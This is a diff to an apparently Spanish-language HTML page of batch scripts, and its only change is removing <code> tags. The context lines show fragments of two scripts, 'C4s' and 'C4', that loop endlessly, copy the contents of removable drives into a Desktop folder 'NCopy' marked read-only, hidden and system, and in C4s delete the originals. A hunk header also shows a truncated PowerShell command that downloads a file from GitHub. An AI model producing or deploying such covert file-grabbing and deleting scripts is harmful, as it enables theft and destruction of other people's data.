@@ -24,7 +24,6 @@ powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubuserconten
 <h3>C4s :</h3>
 <p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio y borra los originales)</b></p>
 <pre>
-<code>
 @echo off
 setlocal EnableDelayedExpansion
 :try
@@ -41,13 +40,11 @@ IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
  ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
 )
 goto try
-</code>
 </pre>
 
 <h3>C4 :</h3>
 <p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio sin editar los archivos originales)</b></p>
 <pre>
-<code>
 @echo off
 setlocal EnableDelayedExpansion
 :try
@@ -63,5 +60,4 @@ IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
  ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
 )
 goto try
-</code>
 </pre>
